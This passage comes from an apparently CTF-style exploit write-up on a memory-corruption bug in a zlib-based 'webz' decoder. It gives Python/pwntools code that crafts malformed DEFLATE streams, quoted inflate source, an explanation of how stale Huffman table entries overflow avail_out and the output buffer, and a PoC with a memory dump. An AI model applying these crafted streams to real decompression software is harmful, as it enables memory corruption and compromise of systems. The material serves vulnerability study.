    code_symbol_freqs <span>=</span> <span>{</span>sym<span>:</span> rle_symbols<span>.</span>count<span>(</span>sym<span>)</span> <span>for</span> sym <span>in</span> <span>set</span><span>(</span>rle_symbols<span>)</span><span>}</span>
    
    code_table_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>19</span>
    <span>for</span> sym <span>in</span> code_symbol_freqs<span>:</span>
        code_table_lengths<span>[</span>sym<span>]</span> <span>=</span> <span>7</span>
    
    ncode <span>=</span> <span>max</span><span>(</span>i <span>for</span> i<span>,</span> length <span>in</span> <span>enumerate</span><span>(</span>order<span>)</span> <span>if</span> code_table_lengths<span>[</span>length<span>]</span> <span>&gt;</span> <span>0</span><span>)</span> <span>+</span> <span>1</span>

    code_huffman_table <span>=</span> generate_huffman_codes_from_lengths<span>(</span>code_table_lengths<span>)</span>

    stream<span>.</span>write_bits<span>(</span>is_last<span>,</span> <span>1</span><span>)</span> <span># BFINAL</span>
    stream<span>.</span>write_bits<span>(</span><span>2</span><span>,</span> <span>2</span><span>)</span> <span># BTYPE (10 for dynamic)</span>

    stream<span>.</span>write_bits<span>(</span>nlen <span>-</span> <span>257</span><span>,</span> <span>5</span><span>)</span>
    stream<span>.</span>write_bits<span>(</span>ndist <span>-</span> <span>1</span><span>,</span> <span>5</span><span>)</span>
    stream<span>.</span>write_bits<span>(</span>ncode <span>-</span> <span>4</span><span>,</span> <span>4</span><span>)</span>

    <span>for</span> i <span>in</span> <span>range</span><span>(</span>ncode<span>)</span><span>:</span>
        stream<span>.</span>write_bits<span>(</span>code_table_lengths<span>[</span>order<span>[</span>i<span>]</span><span>]</span><span>,</span> <span>3</span><span>)</span>
        
    <span>for</span> sym<span>,</span> extra_val <span>in</span> rle_encoded_lengths<span>:</span>
        code<span>,</span> length <span>=</span> code_huffman_table<span>[</span>sym<span>]</span>
        stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
        <span>if</span> sym <span>==</span> <span>16</span><span>:</span> stream<span>.</span>write_bits<span>(</span>extra_val<span>,</span> <span>2</span><span>)</span>
        <span>elif</span> sym <span>==</span> <span>17</span><span>:</span> stream<span>.</span>write_bits<span>(</span>extra_val<span>,</span> <span>3</span><span>)</span>
        <span>elif</span> sym <span>==</span> <span>18</span><span>:</span> stream<span>.</span>write_bits<span>(</span>extra_val<span>,</span> <span>7</span><span>)</span>


    ll_huffman_table <span>=</span> generate_huffman_codes_from_lengths<span>(</span>ll_lengths<span>)</span>
    dist_huffman_table <span>=</span> generate_huffman_codes_from_lengths<span>(</span>dist_lengths<span>)</span>
    
    <span>for</span> <span>type</span><span>,</span> val <span>in</span> symbol_stream<span>:</span>
        <span>if</span> <span>type</span> <span>==</span> <span>&#39;LIT&#39;</span><span>:</span>
            code<span>,</span> length <span>=</span> ll_huffman_table<span>[</span>val<span>]</span>
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
        <span>elif</span> <span>type</span> <span>==</span> <span>&#39;EOB&#39;</span><span>:</span>
            code<span>,</span> length <span>=</span> ll_huffman_table<span>[</span>val<span>]</span>
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
        <span>elif</span> <span>type</span> <span>==</span> <span>&#39;LD&#39;</span><span>:</span>
            l<span>,</span> d <span>=</span> val
            len_sym<span>,</span> len_extra_bits<span>,</span> len_extra_val <span>=</span> find_len_sym<span>(</span>l<span>)</span>
            dist_sym<span>,</span> dist_extra_bits<span>,</span> dist_extra_val <span>=</span> find_dist_sym<span>(</span>d<span>)</span>
            
            code<span>,</span> length <span>=</span> ll_huffman_table<span>[</span>len_sym<span>]</span>
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
            <span>if</span> len_extra_bits <span>&gt;</span> <span>0</span><span>:</span>
                stream<span>.</span>write_bits<span>(</span>len_extra_val<span>,</span> len_extra_bits<span>)</span>
            
            code<span>,</span> length <span>=</span> dist_huffman_table<span>[</span>dist_sym<span>]</span>
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>
            <span>if</span> dist_extra_bits <span>&gt;</span> <span>0</span><span>:</span>
                stream<span>.</span>write_bits<span>(</span>dist_extra_val<span>,</span> dist_extra_bits<span>)</span>
        <span>elif</span> <span>type</span> <span>==</span> <span>&#39;INVALID&#39;</span><span>:</span>
            code<span>,</span> length <span>=</span> val
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>


stream <span>=</span> BitStream<span>(</span><span>)</span>

<span># &#34;AABCABC&#34; -&gt; &#39;A&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, (L=3, D=3), EOB</span>
symbol_stream <span>=</span> <span>[</span>
    <span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>65</span><span>)</span><span>,</span> <span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>65</span><span>)</span><span>,</span> <span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>66</span><span>)</span><span>,</span> <span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>67</span><span>)</span><span>,</span>
    <span>(</span><span>&#39;LD&#39;</span><span>,</span> <span>(</span><span>3</span><span>,</span> <span>3</span><span>)</span><span>)</span>
<span>]</span>

symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>int</span><span>(</span><span>&#39;000000000000110&#39;</span><span>[</span><span>:</span><span>:</span><span>-</span><span>1</span><span>]</span><span>,</span><span>2</span><span>)</span><span>,</span><span>15</span><span>)</span><span>)</span><span>)</span>
symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>int</span><span>(</span><span>&#39;000000001001&#39;</span><span>[</span><span>:</span><span>:</span><span>-</span><span>1</span><span>]</span><span>,</span><span>2</span><span>)</span><span>,</span><span>12</span><span>)</span><span>)</span><span>)</span>

symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span><span>)</span>

<span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span><span>0x200</span><span>)</span><span>:</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>65</span><span>)</span><span>)</span>

ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
ll_lengths<span>[</span><span>65</span><span>]</span> <span>=</span> <span>15</span>  <span># &#39;A&#39;</span>
ll_lengths<span>[</span><span>66</span><span>]</span> <span>=</span> <span>15</span>  <span># &#39;B&#39;</span>
ll_lengths<span>[</span><span>67</span><span>]</span> <span>=</span> <span>15</span>  <span># &#39;C&#39;</span>
ll_lengths<span>[</span><span>68</span><span>]</span> <span>=</span> <span>15</span>  <span># &#39;D&#39;</span>
ll_lengths<span>[</span><span>69</span><span>]</span> <span>=</span> <span>15</span>  <span># &#39;E&#39;</span>
ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>15</span> <span># EOB</span>
ll_lengths<span>[</span><span>257</span><span>]</span> <span>=</span> <span>15</span> <span># Length 3</span>

dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
dist_lengths<span>[</span><span>2</span><span>]</span> <span>=</span> <span>10</span> <span># Distance 3</span>
dist_lengths<span>[</span><span>3</span><span>]</span> <span>=</span> <span>10</span> <span># Distance 4</span>
dist_lengths<span>[</span><span>4</span><span>]</span> <span>=</span> <span>12</span> <span># Distance 5</span>

create_dynamic_deflate_payload<span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
payload <span>=</span> stream<span>.</span>get_bytes<span>(</span><span>)</span>

<span>print</span><span>(</span><span><span>f&#34;Generated DEFLATE payload (</span><span><span>{</span><span>len</span><span>(</span>payload<span>)</span><span>}</span></span><span> bytes):&#34;</span></span><span>)</span>
<span>print</span><span>(</span>payload<span>.</span><span>hex</span><span>(</span><span>)</span><span>)</span>

<span>from</span> pwn <span>import</span> <span>*</span>

p <span>=</span> process<span>(</span><span>&#34;./src/webz_asan&#34;</span><span>)</span>

<span>def</span> <span>send_webz_payload</span><span>(</span>pay<span>)</span><span>:</span>
    MAX_AROUND_WIDTH_HEIGHT <span>=</span> p8<span>(</span><span>0x0</span><span>)</span> <span>+</span> p8<span>(</span><span>52</span><span>)</span> <span>+</span> p8<span>(</span><span>0x0</span><span>)</span> <span>+</span> p8<span>(</span><span>52</span><span>)</span> <span># MAX = 52, 52</span>
    p<span>.</span>send<span>(</span>p32<span>(</span><span>len</span><span>(</span>pay<span>)</span><span>+</span><span>12</span><span>)</span><span>)</span>
    p<span>.</span>send<span>(</span><span>b&#34;WEBZ&#34;</span><span>+</span>MAX_AROUND_WIDTH_HEIGHT<span>+</span><span>b&#34;\x00\x00\x00\x00&#34;</span><span>+</span>pay<span>)</span>

send_webz_payload<span>(</span>payload<span>)</span>

p<span>.</span>interactive<span>(</span><span>)</span></code></pre>
<p>We reproduce the case described above. The Distance table has <code>root=10</code> with a maximum code length of 12, so there are unfilled entries with <code>op=0, bits=0, val=0</code>. By crafting the stream to force a multilevel lookup, we can trigger the vulnerability.</p>
<pre><code>    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>int</span><span>(</span><span>&#39;000000000000110&#39;</span><span>[</span><span>:</span><span>:</span><span>-</span><span>1</span><span>]</span><span>,</span><span>2</span><span>)</span><span>,</span><span>15</span><span>)</span><span>)</span><span>)</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>int</span><span>(</span><span>&#39;000000001001&#39;</span><span>[</span><span>:</span><span>:</span><span>-</span><span>1</span><span>]</span><span>,</span><span>2</span><span>)</span><span>,</span><span>12</span><span>)</span><span>)</span><span>)</span></code></pre>
<p>These are key. The first is a valid 15‑bit length code. The second is an invalid 12‑bit distance code.</p>
<pre><code>dist_lengths<span>[</span><span>4</span><span>]</span> <span>=</span> <span>12</span> <span># Distance 5</span></code></pre>
<p>The valid distance‑5 code is <code>000000001000</code>. Instead, <code>000000001001</code> forces a second‑level lookup that reads an <strong>uninitialized</strong> <code>code</code> entry.</p>
<p><img src="https://velog.velcdn.com/images/0range1337/post/7b0182e9-7034-40b5-aae8-0c65245e277a/image.jpeg"/></p>
<p>As a result, <code>next_in</code>/<code>avail_in</code> are corrupted.</p>
<p>However, this particular memory corruption was not exploitable. If we first decompress dummy data in block one, and then in a second block trigger the bug with a Literal/Length table that only contains EOB, we can corrupt <code>next_in</code>/<code>avail_in</code> without crashing. But since these are <strong>input</strong> stream variables (not output buffer variables), we couldn’t achieve an overflow or OOB write on the decompressed output buffer.</p>
<h3 id="4-2-3-buffer-overflow-exploitable">4-2-3. Buffer Overflow (Exploitable)</h3>
<p>So what should we target to exploit uninitialized table entries? The most promising avenue in zlib is to abuse the copy routines. The stored-block copy and the LZ77 copy are powerful overwrite primitives—if we can disable the checks that constrain them.</p>
<p>In other words, we need to corrupt <code>avail_out</code>, not <code>avail_in</code>. Let’s inspect <code>inflate_fast</code>’s LZ77 decode.</p>
<pre><code>        <span>else</span> <span>if</span> <span>(</span>op <span>&amp;</span> <span>16</span><span>)</span> <span>{</span>                     <span>/* length base */</span>
            len <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>val<span>)</span><span>;</span>
            op <span>&amp;=</span> <span>15</span><span>;</span>                           <span>/* number of extra bits */</span>
            <span>if</span> <span>(</span>op<span>)</span> <span>{</span>
                <span>if</span> <span>(</span>bits <span>&lt;</span> op<span>)</span> <span>{</span>
                    hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                    bits <span>+=</span> <span>8</span><span>;</span>
                <span>}</span>
                len <span>+=</span> <span>(</span><span>unsigned</span><span>)</span>hold <span>&amp;</span> <span>(</span><span>(</span><span>1U</span> <span>&lt;&lt;</span> op<span>)</span> <span>-</span> <span>1</span><span>)</span><span>;</span>
                hold <span>&gt;&gt;=</span> op<span>;</span>
                bits <span>-=</span> op<span>;</span>
            <span>}</span>
            <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:         length %u\n&#34;</span><span>,</span> len<span>)</span><span>)</span><span>;</span>
            <span>if</span> <span>(</span>bits <span>&lt;</span> <span>15</span><span>)</span> <span>{</span>
                hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                bits <span>+=</span> <span>8</span><span>;</span>
                hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                bits <span>+=</span> <span>8</span><span>;</span>
            <span>}</span>
            here <span>=</span> dcode <span>+</span> <span>(</span>hold <span>&amp;</span> dmask<span>)</span><span>;</span>
          dodist<span>:</span>
            op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>bits<span>)</span><span>;</span>
            hold <span>&gt;&gt;=</span> op<span>;</span>
            bits <span>-=</span> op<span>;</span>
            op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>op<span>)</span><span>;</span>
            <span>if</span> <span>(</span>op <span>&amp;</span> <span>16</span><span>)</span> <span>{</span>                      <span>/* distance base */</span>
                dist <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>val<span>)</span><span>;</span>
                op <span>&amp;=</span> <span>15</span><span>;</span>                       <span>/* number of extra bits */</span>
                <span>if</span> <span>(</span>bits <span>&lt;</span> op<span>)</span> <span>{</span>
                    hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                    bits <span>+=</span> <span>8</span><span>;</span>
                    <span>if</span> <span>(</span>bits <span>&lt;</span> op<span>)</span> <span>{</span>
                        hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                        bits <span>+=</span> <span>8</span><span>;</span>
                    <span>}</span>
                <span>}</span>
                dist <span>+=</span> <span>(</span><span>unsigned</span><span>)</span>hold <span>&amp;</span> <span>(</span><span>(</span><span>1U</span> <span>&lt;&lt;</span> op<span>)</span> <span>-</span> <span>1</span><span>)</span><span>;</span>
<span>#<span>ifdef</span> INFLATE_STRICT</span>
                <span>if</span> <span>(</span>dist <span>&gt;</span> dmax<span>)</span> <span>{</span>
                    strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid distance too far back&#34;</span><span>;</span>
                    state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                    <span>break</span><span>;</span>
                <span>}</span>
<span>#<span>endif</span></span>
                hold <span>&gt;&gt;=</span> op<span>;</span>
                bits <span>-=</span> op<span>;</span>
                <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:         distance %u\n&#34;</span><span>,</span> dist<span>)</span><span>)</span><span>;</span></code></pre>
<p>The LZ77 decode in <code>inflate_fast</code> has almost no checks. The only guard is <code>if (dist &gt; dmax)</code>, behind <code>INFLATE_STRICT</code>.</p>
<p>How can it still be safe?</p>
<pre><code>    <span>static</span> <span>const</span> <span>unsigned</span> <span>short</span> lbase<span>[</span><span>31</span><span>]</span> <span>=</span> <span>{</span> <span>/* Length codes 257..285 base */</span>
        <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>,</span> <span>9</span><span>,</span> <span>10</span><span>,</span> <span>11</span><span>,</span> <span>13</span><span>,</span> <span>15</span><span>,</span> <span>17</span><span>,</span> <span>19</span><span>,</span> <span>23</span><span>,</span> <span>27</span><span>,</span> <span>31</span><span>,</span>
        <span>35</span><span>,</span> <span>43</span><span>,</span> <span>51</span><span>,</span> <span>59</span><span>,</span> <span>67</span><span>,</span> <span>83</span><span>,</span> <span>99</span><span>,</span> <span>115</span><span>,</span> <span>131</span><span>,</span> <span>163</span><span>,</span> <span>195</span><span>,</span> <span>227</span><span>,</span> <span>258</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>}</span><span>;</span>
    <span>static</span> <span>const</span> <span>unsigned</span> <span>short</span> lext<span>[</span><span>31</span><span>]</span> <span>=</span> <span>{</span> <span>/* Length codes 257..285 extra */</span>
        <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>17</span><span>,</span> <span>17</span><span>,</span> <span>17</span><span>,</span> <span>17</span><span>,</span> <span>18</span><span>,</span> <span>18</span><span>,</span> <span>18</span><span>,</span> <span>18</span><span>,</span>
        <span>19</span><span>,</span> <span>19</span><span>,</span> <span>19</span><span>,</span> <span>19</span><span>,</span> <span>20</span><span>,</span> <span>20</span><span>,</span> <span>20</span><span>,</span> <span>20</span><span>,</span> <span>21</span><span>,</span> <span>21</span><span>,</span> <span>21</span><span>,</span> <span>21</span><span>,</span> <span>16</span><span>,</span> <span>73</span><span>,</span> <span>200</span><span>}</span><span>;</span></code></pre>
<p>The maximum copy length (LZ77 length) is <code>lbase[28] (258) + ((lext[28] (16) &amp; 15) == 0)</code> → 258. Earlier we noted that <code>inflate_fast</code> is entered only when <code>strm-&gt;avail_out &gt;= 258</code>, and the loop exits as soon as that’s no longer true. Thus, <code>inflate_fast</code> can safely omit length checks because it guarantees there are at least 258 bytes of space.</p>
<pre><code>            state<span>-&gt;</span>next <span>=</span> state<span>-&gt;</span>codes<span>;</span>
            state<span>-&gt;</span>lencode <span>=</span> state<span>-&gt;</span>distcode <span>=</span> <span>(</span><span>const</span> code FAR <span>*</span><span>)</span><span>(</span>state<span>-&gt;</span>next<span>)</span><span>;</span>
            state<span>-&gt;</span>lenbits <span>=</span> <span>7</span><span>;</span>
            ret <span>=</span> <span>inflate_table</span><span>(</span>CODES<span>,</span> state<span>-&gt;</span>lens<span>,</span> <span>19</span><span>,</span> <span>&amp;</span><span>(</span>state<span>-&gt;</span>next<span>)</span><span>,</span>
                                <span>&amp;</span><span>(</span>state<span>-&gt;</span>lenbits<span>)</span><span>,</span> state<span>-&gt;</span>work<span>)</span><span>;</span></code></pre>
<p>In <code>inflate</code>, tables are written into <code>state-&gt;codes</code>, which is not cleared between blocks. The tables’ boundaries aren’t fixed either; <code>state-&gt;next</code> advances dynamically, so different blocks can lay out different tables at different offsets.</p>
<p>Therefore, stale entries from a previous block can persist in uninitialized slots of later tables—<strong>even of different types</strong>.</p>
<p>If a Distance-table entry from a previous block remains in an uninitialized slot of the subsequent Literal/Length table, we’re in trouble. Deflate limits <strong>lengths</strong> to 258, but <strong>distances</strong> can be much larger. If a stale <strong>Distance</strong> entry is misinterpreted as a <strong>Length</strong> entry in <code>inflate_fast</code>, its length can exceed 258, breaking the invariant that made <code>inflate_fast</code> safe.</p>
<pre><code>    strm<span>-&gt;</span>avail_out <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>out <span>&lt;</span> end <span>?</span>
                                 <span>257</span> <span>+</span> <span>(</span>end <span>-</span> out<span>)</span> <span>:</span> <span>257</span> <span>-</span> <span>(</span>out <span>-</span> end<span>)</span><span>)</span><span>;</span></code></pre>
<p>Ultimately, when the LZ77 decode interprets a stale Distance entry as a Length, <code>strm-&gt;avail_out</code> suffers an integer overflow. Unlike <code>avail_in</code>, <code>avail_out</code> reflects the remaining size of the output buffer, so this immediately leads to a buffer overflow.</p>
<pre><code><span>#<span>define</span> MAX_INPUT_SIZE 4096</span>
<span>#<span>define</span> MAX_OUTPUT_SIZE (MAX_INPUT_SIZE * 2)</span>

<span>typedef</span> <span>struct</span> <span>EncodedWebz</span> <span>{</span>
    uint8_t data<span>[</span>MAX_INPUT_SIZE<span>]</span><span>;</span>
    size_t size<span>;</span>
<span>}</span> EncodedWebz<span>;</span>

<span>typedef</span> <span>struct</span> <span>DecodedWebz</span> <span>{</span>
    uint8_t data<span>[</span>MAX_OUTPUT_SIZE<span>]</span><span>;</span>
    size_t size<span>;</span>
<span>}</span> DecodedWebz<span>;</span>

<span>typedef</span> <span>struct</span> <span>WebzState</span> <span>{</span>
    EncodedWebz encoded<span>;</span>
    DecodedWebz decoded<span>;</span>
    z_stream infstream<span>;</span>
    <span>char</span> ok_status<span>[</span><span>5</span><span>]</span><span>;</span>
<span>}</span> WebzState<span>;</span>

WebzState webz_state<span>;</span></code></pre>
<p>The decompressed bytes are written into the global <code>webz_state</code> in <code>webz.c</code>. To actually corrupt memory, we must write more than <code>8192</code> bytes and overflow into the following <code>z_stream infstream</code>, overwriting its fields.</p>
<h3 id="4-2-4-poc">4-2-4. PoC</h3>
<pre><code>stream <span>=</span> BitStream<span>(</span><span>)</span>

<span># STORED BLOCK ===============================================================================</span>
stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>1</span><span>)</span> <span># BFINAL</span>
stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>2</span><span>)</span> <span># BTYPE (0 for stored)</span>
stream<span>.</span>bytebits<span>(</span><span>)</span>
stored_block_length <span>=</span> <span>0x200</span>
stream<span>.</span>write_bits<span>(</span>stored_block_length <span>+</span> <span>(</span> <span>(</span>stored_block_length <span>^</span> <span>0xffff</span><span>)</span> <span>&lt;&lt;</span> <span>16</span> <span>)</span><span>,</span> <span>32</span><span>)</span> 
<span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span> stored_block_length<span>)</span><span>:</span>
    stream<span>.</span>write_bits<span>(</span><span>ord</span><span>(</span><span>&#39;X&#39;</span><span>)</span><span>,</span> <span>8</span><span>)</span>
<span># STORED BLOCK ===============================================================================</span>

<span># DYNAMIC BLOCK ==============================================================================</span>
symbol_stream <span>=</span> <span>[</span> <span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span> <span>]</span>

ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>3</span> <span># EOB</span>

dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
<span>for</span> i <span>in</span> <span>range</span><span>(</span><span>17</span><span>,</span><span>30</span><span>)</span><span>:</span>
    dist_lengths<span>[</span>i<span>]</span> <span>=</span> <span>15</span>

create_dynamic_deflate_payload<span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
<span># DYNAMIC BLOCK ==============================================================================</span>

<span># DYNAMIC BLOCK ==============================================================================</span>
symbol_stream <span>=</span> <span>[</span><span>]</span>

symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>8</span><span>,</span><span>10</span><span>)</span><span>)</span><span>)</span>
symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>0b1111111</span><span>,</span><span>7</span><span>)</span><span>)</span><span>)</span> <span># extra bits</span>
symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>int</span><span>(</span><span>&#39;000&#39;</span><span>[</span><span>:</span><span>:</span><span>-</span><span>1</span><span>]</span><span>,</span><span>2</span><span>)</span><span>,</span><span>3</span><span>)</span><span>)</span><span>)</span>
symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>0b1111111</span><span>,</span><span>7</span><span>)</span><span>)</span><span>)</span> <span># extra bits</span>
symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span><span>)</span>
ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>10</span> <span># EOB</span>
ll_lengths<span>[</span><span>257</span><span>]</span> <span>=</span> <span>10</span> <span># Length 3</span>
ll_lengths<span>[</span><span>258</span><span>]</span> <span>=</span> <span>12</span> <span># Length 4</span>

dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
dist_lengths<span>[</span><span>17</span><span>]</span> <span>=</span> <span>3</span> <span># Distance ???</span>

create_dynamic_deflate_payload<span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
<span># DYNAMIC BLOCK ==============================================================================</span>

<span># STORED BLOCK ===============================================================================</span>
stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span> <span># dummy</span>
stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>1</span><span>)</span> <span># BFINAL</span>
stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>2</span><span>)</span> <span># BTYPE (0 for stored)</span>
stream<span>.</span>bytebits<span>(</span><span>)</span>
stored_block_length <span>=</span> <span>0x10</span>
stream<span>.</span>write_bits<span>(</span>stored_block_length <span>+</span> <span>(</span> <span>(</span>stored_block_length <span>^</span> <span>0xffff</span><span>)</span> <span>&lt;&lt;</span> <span>16</span> <span>)</span><span>,</span> <span>32</span><span>)</span> 
<span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span> stored_block_length<span>)</span><span>:</span>
    stream<span>.</span>write_bits<span>(</span><span>ord</span><span>(</span><span>&#39;C&#39;</span><span>)</span><span>,</span> <span>8</span><span>)</span>
<span># STORED BLOCK ===============================================================================</span>

<span># DYNAMIC BLOCK ==============================================================================</span>
symbol_stream <span>=</span> <span>[</span><span>]</span>
symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>65</span><span>)</span><span>)</span>
<span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span><span>0x2ce</span><span>)</span><span>:</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;LD&#39;</span><span>,</span> <span>(</span><span>10</span><span>,</span> <span>1</span><span>)</span><span>)</span><span>)</span>
<span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span><span>7</span><span>)</span><span>:</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>65</span><span>)</span><span>)</span>
symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span><span>)</span>

ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
ll_lengths<span>[</span><span>65</span><span>]</span> <span>=</span> <span>3</span>  <span># &#39;A&#39;</span>
ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>3</span> <span># EOB</span>
ll_lengths<span>[</span><span>264</span><span>]</span> <span>=</span> <span>3</span> <span># Length 10</span>

dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
dist_lengths<span>[</span><span>0</span><span>]</span> <span>=</span> <span>3</span> <span># Distance 1</span>


create_dynamic_deflate_payload<span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
<span># DYNAMIC BLOCK ==============================================================================</span>

<span># STORED BLOCK ===============================================================================</span>
overwrriten_infstream <span>=</span> <span>b&#39;X&#39;</span><span>*</span><span>0x60</span>

stream<span>.</span>write_bits<span>(</span><span>1</span><span>,</span> <span>1</span><span>)</span> <span># BFINAL</span>
stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>2</span><span>)</span> <span># BTYPE (0 for stored)</span>
stream<span>.</span>bytebits<span>(</span><span>)</span>
stored_block_length <span>=</span> <span>len</span><span>(</span>overwrriten_infstream<span>)</span>
stream<span>.</span>write_bits<span>(</span>stored_block_length <span>+</span> <span>(</span> <span>(</span>stored_block_length <span>^</span> <span>0xffff</span><span>)</span> <span>&lt;&lt;</span> <span>16</span> <span>)</span><span>,</span> <span>32</span><span>)</span> 
<span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span> stored_block_length<span>)</span><span>:</span>
    stream<span>.</span>write_bits<span>(</span>overwrriten_infstream<span>[</span>i<span>]</span><span>,</span> <span>8</span><span>)</span>
<span># STORED BLOCK =============================================================================</span>

<span>&#34;&#34;&#34;
0x000064f4b0253370│+0x0000: 0x000064f4b02507de  →  0x0000000000000000
0x000064f4b0253378│+0x0008: 0x0000000000000000
0x000064f4b0253380│+0x0010: 0x0000000000000472
0x000064f4b0253388│+0x0018: 0x000064f4b0253370  →  0x000064f4b02507de  →  0x0000000000000000
0x000064f4b0253390│+0x0020: 0x00000000ffffe304  →  0x0000000000000000
0x000064f4b0253398│+0x0028: 0x0000000000002008
0x000064f4b02533a0│+0x0030: 0x000064f4b02533e0  →  0x0000000000000000
0x000064f4b02533a8│+0x0038: 0x0000000000000000
